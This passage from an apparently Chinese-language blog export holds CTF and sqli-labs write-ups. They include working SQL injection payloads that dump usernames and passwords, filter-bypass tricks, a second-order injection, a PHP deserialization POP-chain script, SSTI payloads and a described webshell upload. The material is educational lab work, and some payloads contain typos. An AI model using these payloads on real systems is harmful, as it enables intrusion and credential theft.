+<p>![picture](D:\p\picture\屏幕截图 2021-10-29 204544.png)</p>
+<p>在sql的25关对or和and进行了过滤，所以我们输入了or但显示我们的输入为空，</p>
+<p>用双写</p>
+<p>![picture](D:\p\picture\屏幕截图 2021-10-29 205014.png)</p>
+<p>id=oorr</p>
+<p>因为正则表达式匹配了or并把or过滤了oorr中or被过滤了就剩下了or说以可以用双写绕过</p>
+<p>大写绕过</p>
+<p>![picture](D:\p\picture\屏幕截图 2021-10-29 205601.png)</p>
+<p>27题过滤了union所以我们输了union被过滤了</p>
+<p>前提mysql语句是对大写不敏感的所以我们在写语句的时候就可以随意大写</p>
+<p>因为正则表达式并没有完全匹配所以的大写组合，那我们一个一个试</p>
+<p>尝试uniON</p>
+<p>![picture](D:\p\picture\屏幕截图 2021-10-29 210052.png)</p>
+<p>成功了</p>
+<p>我认为短单词适合用双写，因为短字母的大写组合少比较好过滤，而且双写也比较好认，长单词相反，不过怎么绕过还是要看后端是怎么过滤的</p>
+<p>如果后端的正则用了/m修饰符（换行匹配）那么双写绕过就会失效，换行匹配会把双写被匹配完的带空格的字符串也匹配，所以只能用双写，</p>
+<p>![picture](D:\p\picture\屏幕截图 2021-10-29 211346.png)</p>
+<p>在27关中–+也被过滤掉了sql语句就会剩下一个‘，这时就要用and ’1‘=’1来闭合</p>
+<p>因为‘1’=‘1’是恒为真</p>
+<p>![picture](D:\p\picture\屏幕截图 2021-10-29 212058.png)</p>
+<p>在27题中空格也被过滤了，用%0a来绕过过滤</p>
+<p>![picture](D:\p\picture\屏幕截图 2021-10-29 212437.png)</p>
+<h1 id="注释绕过"><a href="#注释绕过" class="headerlink" title="注释绕过"></a>注释绕过</h1><p>![picture](D:\p\picture\屏幕截图 2021-10-29 212834.png)</p>
+<p>在32关中‘被/注释掉了，这时候就要加%df，或其他大与128的16进制数，在gbk编码中两个16进制数来表示一个中文字符，该方法叫宽字符注入</p>
+<p>![picture](D:\p\picture\屏幕截图 2021-10-29 213336.png)</p>
+<p>%df与%5c被认为是一个中文字符，而%27被剩下来被解释成了’</p>
+<h1 id="orderby注入"><a href="#orderby注入" class="headerlink" title="orderby注入"></a>orderby注入</h1><p>和联合注入没什么区别，就是写语句的方式变了</p>
+<p>盲注可以用rand（）在为真和为假时排列的顺序会不一样</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>web复现</title>
+    <url>/2021/11/23/1-1/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>HTML source</p>
+<p>F12查看源码</p>
+<p>网页访问流程：客户端发请求，服务器</p>
+<h2 id="Cookies"><a href="#Cookies" class="headerlink" title="Cookies"></a>Cookies</h2><p>Cookie是储存用户信息，终端不会记录用户信息，cookie保存在游览器上</p>
+<h2 id="location"><a href="#location" class="headerlink" title="location"></a>location</h2><p>网站状态码</p>
+<p>1xx请求成功</p>
+<p>2xx请求响应成功</p>
+<p>3xx重新定向</p>
+<p>4xx客户端问题</p>
+<p>5xx服务器问题</p>
+<p>用burp抓包</p>
+<h2 id="Get-Post"><a href="#Get-Post" class="headerlink" title="Get_Post"></a>Get_Post</h2><p>Get post的不同，post比较安全</p>
+<p>Get写在url要用？赋值</p>
+<p>Post写在body</p>
+<h2 id="babyrce"><a href="#babyrce" class="headerlink" title="babyrce"></a>babyrce</h2><p>@eveal函数漏洞可以执行（）中文件的php代码，不是php就显示内容</p>
+<p>通过给（）内的变量赋值执行</p>
+<h2 id="ezinclude"><a href="#ezinclude" class="headerlink" title="ezinclude"></a>ezinclude</h2><p>文件包含，访问包含中的文件就会直接显示，include（）会显示不是php文件的内容，会执行符合php语法的内容</p>
+<h2 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h2><p>php语言的强比较和数据类型转换，intval函数的意义通过使用指定的进制 <code>base</code> 转换（默认是十进制），返回变量 <code>value</code> 的 int 数值</p>
+<h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><p>请求头的应用</p>
+<p>请求头的格式是人为规定的</p>
+<p>127.0.0.1本地请求</p>
+<p>Reffer上一个请求的ip地址</p>
+<p>User-agent 游览器</p>
+<h2 id="babyupload"><a href="#babyupload" class="headerlink" title="babyupload"></a>babyupload</h2><p>文件上传</p>
+<p>用php写一句话木马（用@evaal），用网站的上传功能上传到服务器，用burp伪造文件格式绕过，通过访问上传的文件控制网站</p>
+<h2 id="babyssrf"><a href="#babyssrf" class="headerlink" title="babyssrf"></a>babyssrf</h2><p>可以执行？url=后的代码，网址就显示网址的内容，若是本地文件就直接显示，</p>
+<h2 id="Google"><a href="#Google" class="headerlink" title="Google"></a>Google</h2><p>用sql注入，sql语句会先执行=号后的sql语句</p>
+<h1 id="babyphp2"><a href="#babyphp2" class="headerlink" title="babyphp2"></a>babyphp2</h1><p>md5值，用哈希算法加密，哈希算法不能逆推，但有极少数数据的哈希值是相同的，可以md5碰撞，md5无法识别数组会返回false，可以用两个数组让MD5值相同</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>markdown</title>
+    <url>/2021/11/23/2/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="1-标题的使用"><a href="#1-标题的使用" class="headerlink" title="1.标题的使用"></a>1.标题的使用</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">用#加空格，空格后写标题，#号越多标题等级越低</span><br><span class="line">    # <span class="number">1</span></span><br><span class="line">    ## <span class="number">2</span></span><br><span class="line">    ### <span class="number">3</span></span><br><span class="line">    #### <span class="number">4</span></span><br><span class="line">    ##### <span class="number">5</span></span><br><span class="line">    ###### <span class="number">6</span></span><br><span class="line">    共有六个等级</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
+
+<h1 id="1"><a href="#1" class="headerlink" title="1"></a>1</h1><h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><h4 id="4"><a href="#4" class="headerlink" title="4"></a>4</h4><h5 id="5"><a href="#5" class="headerlink" title="5"></a>5</h5><h6 id="6"><a href="#6" class="headerlink" title="6"></a>6</h6><h1 id="2代码块的使用"><a href="#2代码块的使用" class="headerlink" title="2代码块的使用"></a>2代码块的使用</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">用```后加代码的语言 </span><br><span class="line">    ```java   </span><br></pre></td></tr></table></figure>
+
+<p><strong>注意</strong></p>
+<p>`要切换成英文</p>
+<h1 id="3加粗，高亮，删除符"><a href="#3加粗，高亮，删除符" class="headerlink" title="3加粗，高亮，删除符"></a>3加粗，高亮，删除符</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">*斜体* or _强调_</span><br><span class="line">**加粗** or __加粗__</span><br><span class="line">***粗斜体*** or ___粗斜体__</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
+
+
+
+<p><em>斜体</em> or <em>强调</em> <strong>加粗</strong> or <strong>加粗</strong> <em><strong>粗斜体</strong></em> or _<strong>粗斜体</strong></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">高亮</span><br><span class="line">`` `包裹起来` ``</span><br></pre></td></tr></table></figure>
+
+<p><code>包裹起来</code></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">~~加删除的内容~~</span><br></pre></td></tr></table></figure>
+
+<p><del>加删除的内容</del></p>
+<h1 id="4图片内嵌"><a href="#4图片内嵌" class="headerlink" title="4图片内嵌"></a>4图片内嵌</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">![替换的文字]（打开图片的url或绝对地址）</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/.com//ask.jpg" alt="asuka"></p>
+<h1 id="5link"><a href="#5link" class="headerlink" title="5link"></a>5link</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">[替换的文字]（url）</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://www.google.com.hk/">百度</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>pop链</title>
+    <url>/2021/11/23/3-1/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="pop"><a href="#pop" class="headerlink" title="pop"></a>pop</h1><p>面向属性编程</p>
+<p>简而言之就是利用php中的魔术方法，实现对不同类的调用然后getshell</p>
+<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>源码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Welcome to index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> Show;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+<p>我们看到第一个类Modifier有一个include函数，可以触发文件包含漏洞，，有__invoke魔术方法，该方法是在类被当成函数的时候触发，，在看到test类中</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$function</span> = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$function</span>();</span><br></pre></td></tr></table></figure>
+
+<p>可以自定义一个函数，我们就可以在这触发__invoke，但是这是个__get魔术方法在调用类中没有的变量时会触发，再看到show中的</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br></pre></td></tr></table></figure>
+
+<p>可以让str变量为test类来触发__get</p>
+<p>接下来就是要想办法触发__tostring</p>
+<p>再看到</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">          <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>有个字符的正则匹配会触发__tostring，所以要让source为show类，</p>
+<p>该逻辑是在__wakeup中再反序列化的时后会触发；</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>就get传入pop就行</p>
+<p>脚本</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>=<span class="string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str=<span class="keyword">new</span> Test;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">new</span> Modifier;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> Show();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> Show();</span><br><span class="line"><span class="variable">$b</span>-&gt;source=<span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$b</span>));</span><br></pre></td></tr></table></figure>
+
+]]></content>
+  </entry>
+  <entry>
+    <title>sqllib1-5</title>
+    <url>/2021/11/23/4-1/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一"><a href="#一" class="headerlink" title="一"></a>一</h1><p>![picture](D:\p\picture\屏幕截图 2021-10-19 191622.png)</p>
+<p>题目提示让我们给id一个数字的值，那就让id=1</p>
+<p>![picture](D:\p\picture\屏幕截图 2021-10-19 191848.png)</p>
+<p>能成功查询，接下来就是判断注点</p>
+<p>尝试id=1‘</p>
+<p>![picture](D:\p\picture\屏幕截图 2021-10-19 192146.png)</p>
+<p>报错了很好，说明找到了注点，用’闭合后 报错 ，知道where id=’’，是字符类型的注入</p>
+<p>用union联合注入，但前提条件是联合的两个表列数相同，所以先用order by</p>
+<p>判断列数</p>
+<p>构造playload</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27; order by 1...--+ /*为什么要用--+（也就是-- ），在输入？id=1&#x27;</span></span><br><span class="line">    后php中的sql查询语句会变成where id = <span class="string">&#x27;1&#x27;</span><span class="string">&#x27;,有一个&#x27;</span>会都出导致报错，这时我们在<span class="number">1</span>’的后面添加sql查询语句会被都出的<span class="string">&#x27;注释为id的值:where id=&#x27;</span><span class="number">1</span><span class="string">&#x27;sql语句&#x27;</span>，所以要用注释符把多出的<span class="string">&#x27;注释掉，php就能正确识别sql查询语句了</span></span><br></pre></td></tr></table></figure>
+
+<p>order by 后面的数字不断增加直到报错为止</p>
+<p>![picture](D:\p\picture\屏幕截图 2021-10-19 195701.png)</p>
+<p>到4报错了，说明列数有3列</p>
+<p>接下来就是判断回显点</p>
+<p>构造playload</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&#x27; union select 1,2,3 --+</span></span><br></pre></td></tr></table></figure>
+
+<p>![picture](D:\p\picture\屏幕截图 2021-10-19 201147.png)</p>
+<p>发现显示了2和3，说明回显点在2，3号位</p>
+<p>接下来就是爆数据库名，要用到databa（）sql的元数据</p>
+<p>构造playload</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&#x27; union select 1,2,database()--+； //database（）位置在2，3都没关系</span></span><br></pre></td></tr></table></figure>
+
+<p>![picture](D:\p\picture\屏幕截图 2021-10-19 201754.png)</p>
+<p>这样就得到了数据库名为security</p>
+<p>接着就是爆表名</p>
+<p>首先得知道mysql自带的表</p>
+<p>information_schema.schemata：记录数据库信息的表<br>information_schema.tables：记录表名信息的表<br>information_schema.columns：记录列名信息的表<br>schema_name 数据库名<br>table_name 表名<br>column_name 列名<br>table_schema 数据库名</p>
+<p>构造playload</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&#x27; union seclect 1,2,gruop_concat(table.name) from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;|database()--+//sql查询语句的意思是在记录表名信息的表中查询当前数据库下的所有表，group_concat的作用是去除冗余的数据并合并成一行输出，因为这道只有一行的回显点</span></span><br></pre></td></tr></table></figure>
+
+<p>![picture](D:\p\picture\屏幕截图 2021-10-19 203543.png)</p>
+<p>查到了表名，用户的账号密码肯定是在users的表里，但我们要查询还需要知道</p>
+<p>表里有什么字段所以接下是爆字段</p>
+<p>构造playload</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&#x27; union seclec 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;--+//从所有列名的表中查找表名为users的列</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>![picture](D:\p\picture\屏幕截图 2021-10-19 205422.png)</p>
+<p>找到列username，password</p>
+<p>接着用sql语句查询他们的值</p>
+<p>构造playload</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&#x27; union select 1,2,group_concat(password,username) from users--+</span></span><br></pre></td></tr></table></figure>
+
+<p>![picture](D:\p\picture\屏幕截图 2021-10-19 210030.png)</p>
+<p>查询成功</p>
+<h1 id="二"><a href="#二" class="headerlink" title="二"></a>二</h1><p>![picture](D:\p\picture\屏幕截图 2021-10-19 210153.png)</p>
+<p>题目要求和第一题一样</p>
+<p>首先找注点</p>
+<p>尝试id=1</p>
+<p>![picture](D:\p\picture\屏幕截图 2021-10-19 210418.png)</p>
+<p>成功</p>
+<p>再尝试?id=1’</p>
+<p>![picture](D:\p\picture\屏幕截图 2021-10-19 210615.png)</p>
+<p>从报错中看出php中的sql语句是where id=</p>
+<p>说明是数字型的注入因为用的是同一张表所以playload只是注点不同，其他都相同</p>
+<p>构造playload</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?id=-<span class="number">1</span> union select <span class="number">1</span>,<span class="number">2</span>,group_concat(password,username) <span class="keyword">from</span> users--+</span><br></pre></td></tr></table></figure>
+
+
+
+<p>后面不加注释因为没有需要被注释的字符</p>
+<p><img src="/.com//p\picture\image-20211019211519081.png" alt="picture"></p>
+<p>查询成功</p>
+<h1 id="三"><a href="#三" class="headerlink" title="三"></a>三</h1><p><img src="/.com//p\picture\image-20211019211708416.png" alt="picture"></p>
+<p>同样先尝试id=1</p>
+<p><img src="/.com//p\picture\image-20211019211853243.png" alt="picture"></p>
+<p>成功</p>
+<p>接着尝试id=1’</p>
+<p><img src="/.com//p\picture\image-20211019212026044.png" alt="picture"></p>
+<p>发现报错的和第一题很相似，尝试用第一题的playload试一下</p>
+<p><img src="/.com//p\picture\image-20211019212238414.png" alt="picture"></p>
+<p>寄了</p>
+<p>再仔细看下报错信息</p>
+<p><img src="/.com//Users\rangaork\AppData\Roaming\Typora\typora-user-images\image-20211019212355663.png" alt="image-20211019212355663"></p>
+<p>发现问题了，比第一题多了一个）也就是说多了一个（）的闭合，而我们只闭合**’**</p>
+<p>所以注点要变成id=-1‘）尝试一下</p>
+<p><img src="/.com//p\picture\image-20211019212805821.png" alt="picture"></p>
+<p>やったぜ</p>
+<h1 id="四"><a href="#四" class="headerlink" title="四"></a>四</h1><p><img src="/.com//p\picture\image-20211019213234858.png" alt="picture"></p>
+<p>一样先尝试id=1</p>
+<p><img src="/.com//p\picture\image-20211019213352241.png" alt="image-20211019213352241"></p>
+<p>成功</p>
+<p>再尝试id=1’</p>
+<p><img src="/.com//p\picture\image-20211019213538450.png" alt="image-20211019213538450"></p>
+<p>居然成功了</p>
+<p>再试试id=1“</p>
+<p><img src="/.com//p\picture\image-20211019213814592.png" alt="image-20211019213814592"></p>
+<p>成功报错了，看来这次是”“闭合</p>
+<p>构造playload</p>
+<p>等一下</p>
+<p><img src="/.com//p\picture\image-20211019213955043.png" alt="image-20211019213955043"></p>
+<p>还有一个）</p>
+<p>那就和第三题差不多</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&quot;)  union select 1,2,group_concat(password,username) from users--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/.com//p\picture\image-20211019214257823.png" alt="image-20211019214257823"></p>
+<p>ok</p>
+<h1 id="五"><a href="#五" class="headerlink" title="五"></a>五</h1><p><img src="/.com//p\picture\image-20211019214406388.png" alt="image-20211019214406388"></p>
+<p>老套路</p>
+<p><img src="/.com//p\picture\image-20211019214532459.png" alt="image-20211019214532459"></p>
+<p>有点不太一样，不管先试试id=1’</p>
+<p><img src="/.com//p\picture\image-20211019214733943.png" alt="image-20211019214733943"></p>
+<p>报错能显示出来</p>
+<p>看的注入点是字符’闭合</p>
+<p>但没有写回</p>
+<p>那就试试floor（rand(0）*2)报错注入</p>
+<p>用group by的重复</p>
+<p>floor(rand(0)*2)的作用是伪随机生成0，1</p>
+<p>groupby函数在起作用时会新建一个表来存数据，并会执行两次用floor(rand(0)*2)会产生两个一的时候就会键名重复报错并会输出在groupby中的sql语句</p>
+<p>构造playload</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&#x27; union select count(*),count(*),concat(&#x27;</span>~<span class="string">&#x27;,floor(rand(0)*2),(select username from users limit 0,1)) as a from information_schema.table group by a--+//count()和groupby一起使用报错注入中无法使用group_concat所以用limit来限制行数</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p><img src="/.com//p\picture\image-20211019220805119.png" alt="image-20211019220805119"></p>
+<p>成功.</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>sqlilab_24</title>
+    <url>/2021/11/23/5-1/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h1><p>在对第一次插入数据的时候对插入的数据进行了过滤，但如果只是对特殊字符添加/进行转译，但由于用于转译/不会被写入数据库中，插入数据库中的还是我们输入的语句，在再次调用数据库中我们插入的数据的时候，如果完全信任了数据库中的数据不加过滤的话就会，引起二次注入</p>
+<h1 id="sqlilab-24"><a href="#sqlilab-24" class="headerlink" title="sqlilab_24"></a>sqlilab_24</h1><p>![](D:\p\picture\屏幕截图 2021-10-27 110239.png)</p>
+<p>先试试在登入界面注入</p>
+<p>Dhakkan’#</p>
+<p>![](D:\p\picture\屏幕截图 2021-10-27 110705.png)</p>
+<p>失败了</p>
+<p>查看源码</p>
+<p>![](D:\p\picture\屏幕截图 2021-10-27 113114.png)</p>
+<p>发现添加了过滤</p>
+<p>在看看创建新用户的源码</p>
+<p>![](D:\p\picture\屏幕截图 2021-10-27 113445.png)</p>
+<p>还是添加了过滤</p>
+<p>在看看更改密码的源码</p>
+<p>![](D:\p\picture\屏幕截图 2021-10-27 113909.png)</p>
+<p>没有对username进行过滤，并且查询语句中还用上username</p>
+<p>那我们就对新建一个username，对username进行构造</p>
+<p>新建一个用户名为Dhakkan’#密码为123</p>
+<p>![](D:\p\picture\屏幕截图 2021-10-27 210433.png)</p>
+<p>然后在进行改密码操作将密码改成321</p>
+<p>![](D:\p\picture\屏幕截图 2021-10-27 210651.png)</p>
+<p>此时更改密码的语句就会变为username=’Dhakkan’#’and password=’321’</p>
+<p>这样就形成了一个sql注入语句变成了更改了Dhakkan的密码这样我们就能用321登入账号Dhakkan了</p>
+<p>![](D:\p\picture\屏幕截图 2021-10-27 211541.png)</p>
+<p>成功用321登入改账号</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>ssti</title>
+    <url>/2021/11/23/7-1/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="flask框架"><a href="#flask框架" class="headerlink" title="flask框架"></a>flask框架</h1><p>flask框架是使用python编写的模板，所以我们注入的语句要符合python的语法。</p>
+<p>ssti注入的目的是让读取flag，所以要找到一个类能执行读取flag的代码</p>
+<p>__class__ #返回type类型，查看对象的类型<br>__bases__ #返回tuple类型，列出该类的基类<br>__mro__   #返回tuple类型，给出解析方法调用的顺序<br>__subclasses__() #返回内建方法builtin_function_or_method，获取一个类的子类<br>_<em>globals</em>_ #返回dict类型，对函数进行操作，获取当前空间下能使用的模块、方法、变量</p>
+<p>用上方列出的魔术方法找到能执行os或eval的类</p>
+<p>然后用__init __魔术方法在该类被调用的时候执行读flag的代码</p>
+<h1 id="smarty模板"><a href="#smarty模板" class="headerlink" title="smarty模板"></a>smarty模板</h1><p>smarty模板是基于php的模板并且能直接用system函数执行系统命令</p>
+<p>smarty中可以用if来快速读取flag语法</p>
+<p>{if readfile(/flag)}{/if}</p>
+<h1 id="twig模板"><a href="#twig模板" class="headerlink" title="twig模板"></a>twig模板</h1><p>twig模板也是基于php的一个模板，与smarty不同他不能直接使用函数</p>
+<p>详情参考</p>
+<p><a href="https://xz.aliyun.com/t/10056">https://xz.aliyun.com/t/10056</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>无列名注入</title>
+    <url>/2021/11/23/6-1/</url>
